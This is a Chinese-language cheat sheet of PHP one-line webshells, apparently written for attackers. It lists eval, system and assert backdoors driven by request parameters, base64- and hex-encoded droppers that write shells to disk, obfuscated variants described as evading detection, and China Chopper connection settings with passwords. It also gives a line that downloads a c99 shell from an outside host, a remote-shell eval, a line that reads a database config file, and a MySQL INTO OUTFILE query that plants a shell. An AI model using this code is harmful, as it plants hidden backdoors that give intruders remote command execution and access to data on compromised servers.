基础类的一句话
<?php @eval($_GET["code"])?>

<?php @system($_POST["cmd"])?>

<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);？>
配置：//菜刀提交  http://192.168.1.5/x.php?x=lostwolf  脚本类型:php  密码为 c

编码的替换的类型
<?php @fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));?>
//会生成<?php @eval($_POST['lostwolf']);?>

<script language="php">@fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));</script>
//php在html内部的一种嵌入方式

<?php fputs (fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"))?>


<?php
session_start();
$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);
$_SESSION['theCode']&&preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');?>

乱七八糟类型的：
<?php $_GET[a]($_GET[b]);?>
//?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};

<?php assert($_REQUEST["c"]);?>     //菜刀连接 躲避检测 密码c 

<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);？>
//菜刀提交  http://192.168.1.5/x.php?x=lostwolf  脚本类型:php  密码为 c

下载类型的：

1 <?php echo copy("http://www.r57.me/c99.txt","lostwolf.php"); ?> 
2 
3 <? echo file_get_contents("..//cfg_database.php");?> //显示某文件
4 
5 <? eval ( file_get_contents("远程shell")) ?> //运行远程shell

无关键函数类型：
<?php
$_="";
$_[+""]='';
$_="$_"."";
$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
?>
<?php ${'_'.$_}['_'](${'_'.$_}['__']);?>
http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是pass

<?$_="";$_[+""]='_';$_="$_"."";$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");?>

SQL写一句话（MySQL）

1 select "<?php @system($_POST["cmd"]);?>" into outfile "/home/webaccount/projectname/www/*.php"
2 #前面是一句话内容 后面是绝对路径www下的PHP文件，同理其他脚本也可以
